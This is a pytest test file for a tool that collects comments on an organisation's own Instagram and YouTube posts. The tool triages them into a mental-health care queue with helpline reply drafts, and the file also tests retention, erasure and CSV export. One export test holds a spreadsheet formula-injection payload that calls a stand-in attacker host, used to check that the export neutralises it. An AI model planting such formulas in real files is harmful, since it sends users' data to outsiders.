"""Own-post collection: guards, triage into the care queue, storage, sources. Offline (fakes only)."""

import pytest

from server.audience.accounts import AccountsError
from server.audience.collect import AudienceError, collect_own_comments, to_audience
from server.audience.models import AudienceComment
from server.audience.sources import (
    InstagramSource, OwnPost, SourceError, YouTubeSource, clean_instagram_url,
)
from server.collection.collectors.base import CollectorFatalError
from server.collection.cli import CliError
from server.collection.models import CommentRow

ACCOUNT = "mmtf_official"


@pytest.fixture(autouse=True)
def own_account(monkeypatch):
    monkeypatch.setenv("MMTF_OWN_ACCOUNTS", f"instagram:{ACCOUNT}; youtube:@mmtfchannel")


def post(n=1, **kw):
    return OwnPost("instagram", ACCOUNT, f"https://www.instagram.com/p/P{n}/", f"P{n}", f"caption {n}", kw.pop("comment_count", None), None)


def row(post_url, i, text, user=None, **kw):
    return CommentRow(platform="instagram", username=user or f"user{i}", user_id=f"id{i}", comment=text, likes=i,
                      created_at="2026-10-01T10:00:00Z", post_url=post_url, provider="truescrape", comment_id=f"c{post_url[-3:]}{i}", **kw)


class FakeSource:
    platform = "instagram"
    credits_used = 0.0

    def __init__(self, posts, notes=()):
        self.posts, self.notes, self.ready = posts, list(notes), True

    def check_ready(self):
        if not self.ready:
            raise SourceError("TRUESCRAPE_API_KEY is not set")

    async def list_posts(self, account, n):
        return self.posts[:n], list(self.notes)

    async def check_posts(self, urls, account):
        return [p for p in self.posts if p.url in urls], list(self.notes)


class FakeCollector:
    def __init__(self, by_url, per_post_cost=1.0, fatal_on=None, boom_on=None):
        self.by_url, self.cost, self.fatal_on, self.boom_on, self.spent, self.calls = by_url, per_post_cost, fatal_on, boom_on, 0.0, []

    async def fetch_comments(self, posts, limits):
        url = posts[0].url
        self.calls.append((url, limits[url]))
        if url == self.fatal_on:
            raise CollectorFatalError("TrueScrape out of credits")
        if url == self.boom_on:
            raise RuntimeError("upstream hiccup")
        self.spent += self.cost
        return {url: self.by_url.get(url, [])}

    def usage(self):
        return {"truescrape": {"credits_used": self.spent}, "rows_by_provider": {"truescrape": 3}}


async def run(posts, by_url, db, **kw):
    collector = kw.pop("collector", None) or FakeCollector(by_url)
    return await collect_own_comments("instagram", source=FakeSource(posts), collector=collector, db_path=db, **kw), collector


# ---- guards ----------------------------------------------------------------------------------------------------------
@pytest.mark.asyncio
async def test_nothing_is_collected_unless_the_account_is_configured_as_ours(monkeypatch, tmp_path):
    db = str(tmp_path / "a.db")
    monkeypatch.delenv("MMTF_OWN_ACCOUNTS")
    with pytest.raises(AudienceError, match="MMTF_OWN_ACCOUNTS"):
        await collect_own_comments("instagram", source=FakeSource([post()]), collector=FakeCollector({}), db_path=db)
    monkeypatch.setenv("MMTF_OWN_ACCOUNTS", "instagram:ours")
    with pytest.raises(AudienceError, match="not one of MMTF's"):
        await collect_own_comments("instagram", account="somebody_famous", source=FakeSource([post()]), collector=FakeCollector({}), db_path=db)


@pytest.mark.asyncio
async def test_platforms_without_an_ownership_check_are_refused(tmp_path):
    for platform in ("x", "reddit", "linkedin"):
        with pytest.raises(AudienceError, match="cannot be ownership-checked"):
            await collect_own_comments(platform, db_path=str(tmp_path / "a.db"))


@pytest.mark.asyncio
async def test_an_unready_source_is_reported_not_swallowed(tmp_path):
    src = FakeSource([post()])
    src.ready = False
    with pytest.raises(AudienceError, match="TRUESCRAPE_API_KEY"):
        await collect_own_comments("instagram", source=src, collector=FakeCollector({}), db_path=str(tmp_path / "a.db"))


@pytest.mark.asyncio
async def test_no_confirmed_posts_means_nothing_to_collect(tmp_path):
    src = FakeSource([])
    src.credits_used = 2.0                                              # the listing itself cost credits: say so
    col = FakeCollector({})
    out = await collect_own_comments("instagram", source=src, collector=col, db_path=str(tmp_path / "a.db"))
    assert out["posts_found"] == 0 and "no posts" in out["stopped"] and col.calls == [] and out["credits_used"] == 2.0


# ---- collection + triage -------------------------------------------------------------------------------------------
@pytest.mark.asyncio
async def test_comments_are_collected_triaged_and_the_queue_is_ordered_by_urgency(tmp_path):
    from server.audience.queue import queue_items
    db = str(tmp_path / "a.db")
    p = post(1)
    rows = [
        row(p.url, 1, "Thank you, so helpful"),
        row(p.url, 2, "I feel so anxious before every exam"),
        row(p.url, 3, "I want to die"),
        row(p.url, 4, "can someone suggest a good counsellor?"),
        row(p.url, 5, "thanks for the support!", user=ACCOUNT),         # our own reply: not audience
        row(p.url, 6, "   "),                                           # empty
    ]
    out, col = await run([p], {p.url: rows}, db, max_comments_per_post=500)
    assert col.calls == [(p.url, 500)]
    assert out["comments"] == 4 and out["new"] == 4 and out["new_care_items"] == 3
    assert out["by_label"] == {"positive": 1, "distress": 1, "crisis": 1, "seeking_help": 1}
    assert out["served_by"] == {"truescrape": 4} and out["credits_used"] == 1.0 and out["stopped"] is None

    queue = queue_items(db_path=db)
    assert [q["label"] for q in queue] == ["crisis", "seeking_help", "distress"]       # most urgent first
    assert queue[0]["comment"] == "I want to die" and "Tele-MANAS" in queue[0]["draft"] and "@user3" in queue[0]["draft"]
    assert queue[0]["handling"].startswith("Urgent")


@pytest.mark.asyncio
async def test_collecting_again_never_duplicates_or_undoes_a_reviewers_decision(tmp_path):
    from server.audience.queue import handle_item, queue_items
    db = str(tmp_path / "a.db")
    p = post(1)
    rows = [row(p.url, 3, "I want to die"), row(p.url, 4, "please help me")]
    await run([p], {p.url: rows}, db)
    crisis = queue_items(db_path=db)[0]
    assert handle_item(crisis["key"], "replied", "Asha", "public reply posted", db)["status"] == "replied"

    rows[1] = row(p.url, 4, "please help me")
    rows[1].likes = 99
    out, _ = await run([p], {p.url: rows}, db)
    assert out["new"] == 0 and out["updated"] == 2
    still = queue_items(statuses=("new", "replied", "dismissed"), db_path=db)
    assert len(still) == 2
    assert [q["status"] for q in still if q["label"] == "crisis"] == ["replied"]      # not reset to 'new'


@pytest.mark.asyncio
async def test_credit_cap_is_checked_between_posts(tmp_path):
    posts = [post(i) for i in (1, 2, 3, 4)]
    by_url = {p.url: [row(p.url, 1, "great post")] for p in posts}
    col = FakeCollector(by_url, per_post_cost=2.0)
    out, _ = await run(posts, by_url, str(tmp_path / "a.db"), collector=col, max_credits=3)
    assert len(col.calls) == 2                       # 0 -> 2 -> 4 >= 3: the third post is never fetched
    assert "credit cap reached" in out["stopped"] and "2 post(s) not collected" in out["stopped"]


@pytest.mark.asyncio
async def test_a_provider_that_cannot_continue_stops_the_run_but_keeps_what_was_collected(tmp_path):
    posts = [post(1), post(2), post(3)]
    by_url = {p.url: [row(p.url, 1, "so true")] for p in posts}
    out, col = await run(posts, by_url, str(tmp_path / "a.db"), collector=FakeCollector(by_url, fatal_on=posts[1].url))
    assert out["comments"] == 1 and out["stopped"] == "provider unavailable" and any("out of credits" in n for n in out["notes"])
    assert len(col.calls) == 2


@pytest.mark.asyncio
async def test_one_failing_post_does_not_lose_the_others(tmp_path):
    posts = [post(1), post(2), post(3)]
    by_url = {p.url: [row(p.url, 1, "so true")] for p in posts}
    out, _ = await run(posts, by_url, str(tmp_path / "a.db"), collector=FakeCollector(by_url, boom_on=posts[1].url))
    assert out["comments"] == 2 and out["stopped"] is None and any("hiccup" in n for n in out["notes"])


@pytest.mark.asyncio
async def test_limits_are_clamped(tmp_path):
    p = post(1)
    _, col = await run([p], {p.url: []}, str(tmp_path / "a.db"), max_comments_per_post=10**9, max_posts=10**6)
    assert col.calls[0][1] == 1000


def test_stored_comment_length_is_capped():
    base = dict(platform="instagram", post_url="u", provider="x", username="a")
    assert len(to_audience(CommentRow(comment="x" * 20000, **base), ACCOUNT).comment) == 5000


def test_to_audience_drops_the_accounts_own_replies_and_blank_text():
    base = dict(platform="instagram", post_url="u", provider="x")
    assert to_audience(CommentRow(username="@MMTF_Official", comment="thanks!", **base), ACCOUNT) is None
    assert to_audience(CommentRow(username="a", comment="  ", **base), ACCOUNT) is None
    assert isinstance(to_audience(CommentRow(username="a", comment="hi", **base), ACCOUNT), AudienceComment)


# ---- queue views, retention, erasure -------------------------------------------------------------------------------
@pytest.mark.asyncio
async def test_assistant_view_never_contains_usernames_or_comment_text(tmp_path):
    from server.audience.queue import queue_items
    db = str(tmp_path / "a.db")
    p = post(1)
    await run([p], {p.url: [row(p.url, 3, "I want to die", user="secret_name")]}, db)
    (item,) = queue_items(with_text=False, db_path=db)
    blob = repr(item)
    assert "secret_name" not in blob and "want to die" not in blob and "Tele-MANAS" not in blob
    assert item["label"] == "crisis" and item["key"] and item["waiting_hours"] is not None


def test_reply_drafts_use_the_configured_helpline_and_add_childline_for_possible_minors(monkeypatch):
    from server.audience.templates import reply_draft
    plain = reply_draft("crisis", "sam")
    assert "14416" in plain["draft"] and "1098" not in plain["draft"]
    minor = reply_draft("crisis", "sam", possible_minor=True)
    assert "1098" in minor["draft"] and "Possible minor" in minor["handling"]
    monkeypatch.setenv("CARE_HELPLINE_TEXT", "Call 9-9-9.")
    monkeypatch.setenv("CARE_SUPPORT_LINK", "https://mmtf.example/find")
    assert "Call 9-9-9." in reply_draft("seeking_help", "sam")["draft"] and "mmtf.example/find" in reply_draft("seeking_help", "sam")["draft"]
    assert reply_draft("positive", "sam") == {"draft": "", "handling": ""}
    assert "no private" not in reply_draft("distress", "sam")["draft"].lower() and "dm" not in reply_draft("crisis", "sam")["draft"].lower().split()


@pytest.mark.asyncio
async def test_purge_keeps_unhandled_care_items_and_erases_one_persons_rows_on_request(tmp_path):
    import sqlite3
    from server.audience.queue import handle_item, queue_items
    from server.storage import audience as store
    db = str(tmp_path / "a.db")
    p = post(1)
    rows = [row(p.url, 1, "I want to die", user="Alice"), row(p.url, 2, "please help me", user="bob"),
            row(p.url, 3, "great post", user="carol"), row(p.url, 4, "so true", user="alice")]
    await run([p], {p.url: rows}, db)
    handled = [q for q in queue_items(db_path=db) if q["label"] == "seeking_help"][0]
    handle_item(handled["key"], "dismissed", "Asha", "", db)
    con = sqlite3.connect(db)
    con.execute("UPDATE audience_comments SET collected_at='2020-01-01T00:00:00+00:00', handled_at='2020-01-02T00:00:00+00:00'")
    con.commit(); con.close()

    out = store.purge(90, db)
    assert out == {"handled_care_items": 1, "other_comments": 2}
    left = store.list_comments(db_path=db)
    assert [r["label"] for r in left] == ["crisis"]                       # the unhandled crisis comment survived

    assert store.forget_user("instagram", "@ALICE", db) == 1             # case-insensitive
    assert store.list_comments(db_path=db) == []


def test_status_must_be_a_known_one(tmp_path):
    from server.storage import audience as store
    with pytest.raises(ValueError):
        store.set_status("nope", "archived", db_path=str(tmp_path / "a.db"))
    assert store.set_status("missing", "replied", db_path=str(tmp_path / "a.db")) is None


# ---- export -----------------------------------------------------------------------------------------------------------
@pytest.mark.asyncio
async def test_export_neutralises_spreadsheet_formulas_and_flags_personal_data(tmp_path):
    import csv
    from server.audience.export import export_audience
    db = str(tmp_path / "a.db")
    p = post(1)
    evil = '=HYPERLINK("http://evil.example/?x="&A1,"click")'
    await run([p], {p.url: [row(p.url, 1, evil, user="+attacker"), row(p.url, 2, "I feel so anxious before every exam")]}, db)
    out = export_audience(out_dir=str(tmp_path / "ex"), db_path=db)
    assert out["rows"] == 2 and out["contains_personal_data"]
    with open(out["path"], encoding="utf-8-sig", newline="") as fh:
        rows = list(csv.DictReader(fh))
    by_label = {r["label"]: r for r in rows}
    assert by_label["spam"]["comment"].startswith("'=HYPERLINK")            # shown as text, never run
    assert by_label["spam"]["username"] == "'+attacker"
    assert by_label["distress"]["comment"] == "I feel so anxious before every exam" and by_label["distress"]["reasons"]


# ---- sources ---------------------------------------------------------------------------------------------------------
@pytest.mark.parametrize("url,expected", [
    ("https://www.instagram.com/p/ABC_123/?igsh=xyz", "https://www.instagram.com/p/ABC_123/"),
    ("https://instagram.com/reel/XyZ-9/", "https://www.instagram.com/reel/XyZ-9/"),
    ("https://www.instagram.com/someone/p/AbC/", "https://www.instagram.com/p/AbC/"),
    ("https://www.instagram.com/someone/", None),
    ("https://evil.example/p/ABC/", None),
    ("not a url", None),
])
def test_instagram_post_urls_are_cleaned_or_refused(url, expected):
    assert clean_instagram_url(url) == expected


class FakeIG:
    credits_used = 0.0

    def __init__(self, grid=(), posts=None):
        self.grid, self.posts = list(grid), posts or {}

    def is_available(self):
        return True

    async def instagram_user_posts(self, handle, n):
        return self.grid

    async def instagram_post(self, url):
        return self.posts.get(url)


def facts(code, owner, count=None):
    return {"post_id": code, "url": f"https://www.instagram.com/p/{code}/", "author_handle": owner, "caption": "c", "comment_count": count, "published_at": None}


@pytest.mark.asyncio
async def test_a_profile_grid_keeps_only_posts_the_account_really_owns():
    src = InstagramSource(FakeIG(grid=[facts("A", ACCOUNT, 5), facts("B", "someone_else"), facts("C", ""), facts("D", ACCOUNT.upper())]))
    posts, notes = await src.list_posts(ACCOUNT, 10)
    assert [p.post_id for p in posts] == ["A", "D"] and posts[0].comment_count == 5
    assert any("collab" in n for n in notes) and any("could not be confirmed" in n for n in notes)


@pytest.mark.asyncio
async def test_a_pasted_post_url_is_collected_only_if_its_owner_is_the_account():
    mine, theirs = "https://www.instagram.com/p/MINE/", "https://www.instagram.com/p/THEIRS/"
    src = InstagramSource(FakeIG(posts={mine: facts("MINE", ACCOUNT), theirs: facts("THEIRS", "a_creator")}))
    posts, notes = await src.check_posts([mine + "?igsh=1", theirs, "https://www.instagram.com/p/GONE/", "https://evil.example/p/X/"], ACCOUNT)
    assert [p.url for p in posts] == [mine]
    assert any("belongs to @a_creator" in n for n in notes) and any("could not confirm" in n for n in notes) and any("not an Instagram" in n for n in notes)


YT_LINES = "\n".join([
    '{"id": "aaaaaaaaaaa", "title": "Exam stress", "comment_count": 12, "timestamp": 1790000000}',
    "not json",
    '{"id": "bbbbbbbbbbb", "title": "Sleep", "upload_date": "20260915"}',
])


@pytest.mark.asyncio
async def test_youtube_lists_a_channels_uploads_and_checks_pasted_urls_against_them():
    seen = []

    async def runner(args, timeout=60.0, **_):
        seen.append(args)
        return 0, YT_LINES, ""

    src = YouTubeSource(binary="yt-dlp", runner=runner)
    posts, _ = await src.list_posts("mmtfchannel", 5)
    assert [p.post_id for p in posts] == ["aaaaaaaaaaa", "bbbbbbbbbbb"]
    assert posts[0].comment_count == 12 and posts[1].published_at == "2026-09-15T00:00:00+00:00"
    assert "https://www.youtube.com/@mmtfchannel/videos" in seen[0] and "5" in seen[0]
    ok, notes = await src.check_posts(["https://youtu.be/aaaaaaaaaaa", "https://www.youtube.com/watch?v=zzzzzzzzzzz"], "mmtfchannel")
    assert [p.post_id for p in ok] == ["aaaaaaaaaaa"] and "not among" in notes[0]


@pytest.mark.asyncio
async def test_youtube_listing_failure_is_reported():
    async def runner(*a, **k):
        raise CliError("exited with code 1: ERROR: channel does not exist")

    with pytest.raises(SourceError, match="could not list"):
        await YouTubeSource(binary="yt-dlp", runner=runner).list_posts("nobody", 3)


def test_youtube_without_yt_dlp_says_so(monkeypatch):
    monkeypatch.setattr("server.audience.sources.find_binary", lambda name: None)
    with pytest.raises(SourceError, match="not installed"):
        YouTubeSource().check_ready()
